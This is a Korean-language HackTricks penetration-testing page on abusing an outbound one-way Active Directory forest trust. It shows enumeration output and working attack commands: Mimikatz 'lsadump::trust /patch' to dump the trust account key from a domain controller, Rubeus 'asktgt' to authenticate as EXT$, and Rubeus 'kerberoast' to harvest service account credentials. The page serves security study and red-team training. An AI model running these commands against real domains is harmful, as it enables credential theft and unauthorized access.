# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

이 시나리오에서 **귀하의 도메인**은 **다른 도메인**의 주체에게 **일부 권한**을 **신뢰**하고 있습니다.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

신뢰 관계가 두 도메인 간에 설정될 때 보안 취약점이 존재합니다. 여기서 도메인 **A**와 도메인 **B**로 식별되며, 도메인 **B**가 도메인 **A**에 대한 신뢰를 확장합니다. 이 설정에서 도메인 **B**를 위해 도메인 **A**에 특별한 계정이 생성되며, 이는 두 도메인 간의 인증 프로세스에서 중요한 역할을 합니다. 도메인 **B**와 연결된 이 계정은 도메인 간 서비스에 접근하기 위한 티켓을 암호화하는 데 사용됩니다.

여기서 이해해야 할 중요한 점은 이 특별한 계정의 비밀번호와 해시가 도메인 **A**의 도메인 컨트롤러에서 명령줄 도구를 사용하여 추출될 수 있다는 것입니다. 이 작업을 수행하는 명령은:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
이 추출은 이름 뒤에 **$**가 붙은 계정이 활성화되어 있고 도메인 **A**의 "Domain Users" 그룹에 속해 있어 이 그룹과 관련된 권한을 상속받기 때문에 가능합니다. 이를 통해 개인은 이 계정의 자격 증명을 사용하여 도메인 **A**에 인증할 수 있습니다.

**경고:** 이 상황을 이용하여 도메인 **A**에서 사용자로서 발판을 마련하는 것이 가능하지만, 권한은 제한적입니다. 그러나 이 접근은 도메인 **A**에서 열거 작업을 수행하기에 충분합니다.

`ext.local`이 신뢰하는 도메인이고 `root.local`이 신뢰받는 도메인인 시나리오에서, `root.local` 내에 `EXT$`라는 사용자 계정이 생성됩니다. 특정 도구를 통해 Kerberos 신뢰 키를 덤프하여 `root.local`의 `EXT$` 자격 증명을 드러낼 수 있습니다. 이를 달성하기 위한 명령은:
```bash
lsadump::trust /patch
```
이후, 추출된 RC4 키를 사용하여 다른 도구 명령을 사용하여 `root.local` 내에서 `root.local\EXT$`로 인증할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
이 인증 단계는 `root.local` 내에서 서비스를 열거하고 심지어 악용할 수 있는 가능성을 열어줍니다. 예를 들어 Kerberoast 공격을 수행하여 서비스 계정 자격 증명을 추출할 수 있습니다:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 명확한 신뢰 비밀번호 수집

이전 흐름에서는 **명확한 텍스트 비밀번호** 대신 신뢰 해시가 사용되었습니다 (이는 **mimikatz에 의해 덤프됨**).

명확한 텍스트 비밀번호는 mimikatz의 \[ CLEAR ] 출력을 16진수로 변환하고 널 바이트 ‘\x00’을 제거하여 얻을 수 있습니다:

![](<../../images/image (938).png>)

신뢰 관계를 생성할 때 사용자가 신뢰를 위해 비밀번호를 입력해야 하는 경우가 있습니다. 이 시연에서 키는 원래의 신뢰 비밀번호이며 따라서 사람이 읽을 수 있습니다. 키가 주기적으로 변경되면 (30일), 명확한 텍스트는 사람이 읽을 수 없지만 기술적으로 여전히 사용 가능합니다.

명확한 텍스트 비밀번호는 신뢰 계정으로 정기적인 인증을 수행하는 데 사용될 수 있으며, 이는 신뢰 계정의 Kerberos 비밀 키를 사용하여 TGT를 요청하는 대안입니다. 여기서 ext.local에서 Domain Admins의 구성원을 위해 root.local을 쿼리합니다:

![](<../../images/image (792).png>)

## 참조

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
